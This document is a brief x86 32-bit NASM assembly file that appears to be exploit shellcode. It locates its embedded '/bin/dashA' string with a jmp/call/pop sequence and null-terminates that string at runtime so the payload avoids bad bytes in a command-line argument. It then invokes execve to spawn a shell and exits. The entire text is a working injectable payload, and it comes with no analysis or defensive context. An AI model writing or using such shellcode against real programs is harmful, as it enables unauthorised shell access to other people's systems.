[section .text]

[BITS 32]

global _start

_start:

    jmp str
delta:
    pop ebx                 ; filename
    xor edx, edx            ; env
    mov ecx, ebx
    add ecx, 4              ; 0x09 messes up cmdline arg
    add ecx, 5
    mov [ecx], dl           ; null term. string
    xor eax, eax
    mov al,  0xb            ; sys_execve
    xor ecx, ecx            ; args
    int 0x80

    xor eax, eax
    mov al, 0x1             ; sys_exit
    xor ebx, ebx            ; err
    int 0x80
str:
    call delta
bash:   db "/bin/dashA"
